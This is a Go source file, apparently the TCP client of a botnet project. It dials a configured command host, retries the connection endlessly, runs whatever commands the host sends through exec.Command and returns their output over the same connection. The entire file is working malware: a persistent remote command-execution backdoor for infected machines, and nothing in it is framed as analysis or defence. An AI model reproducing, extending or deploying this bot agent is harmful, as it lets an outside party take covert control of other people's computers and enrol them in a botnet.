package tcp

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/phanletrunghieu/botnet/common/cmd"
)

// Service struct
type Service struct {
	host          string
	port          int
	connection    net.Conn
	reconnectTime time.Duration
	Error         chan error
}

// NewTCPService create tcpService struct
func NewTCPService(host string, port int) *Service {
	return &Service{
		host:          host,
		port:          port,
		reconnectTime: time.Second,
		Error:         make(chan error),
	}
}

// Run wait for a connection
func (s *Service) Run() {
	conn, err := net.Dial("tcp", s.host+":"+strconv.Itoa(s.port))
	if err != nil {
		go func() {
			s.Error <- err
		}()
		s.Reconnect()
		return
	}

	s.connection = conn
	defer s.connection.Close()

	for {
		buffCommand := make([]byte, 2)
		_, err := s.connection.Read(buffCommand)
		if err != nil {
			go func() {
				s.Error <- err
			}()
			s.Reconnect()
			return
		}

		switch string(buffCommand) {
		case "a":
			log.Println("xxxxxx")
			break
		case cmd.Execute:
			s.executeCommand()
		}
	}
}

// Reconnect try connect when lost connection
func (s *Service) Reconnect() {
	time.Sleep(s.reconnectTime)

	log.Println("Try reconnect...")

	s.Run()
}

func (s *Service) executeCommand() {
	msg, err := bufio.NewReader(s.connection).ReadString('\r')
	if err != nil {
		s.Error <- err
		return
	}

	msg = strings.TrimSpace(msg)
	cmdArgs := strings.Split(msg, " ")
	mcmd := cmdArgs[0]
	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)

	command := exec.Command(mcmd, cmdArgs...)
	output, err := command.Output()
	if err != nil {
		s.Error <- err
		return
	}

	s.connection.Write([]byte(cmd.Result + string(output) + "\r"))
}
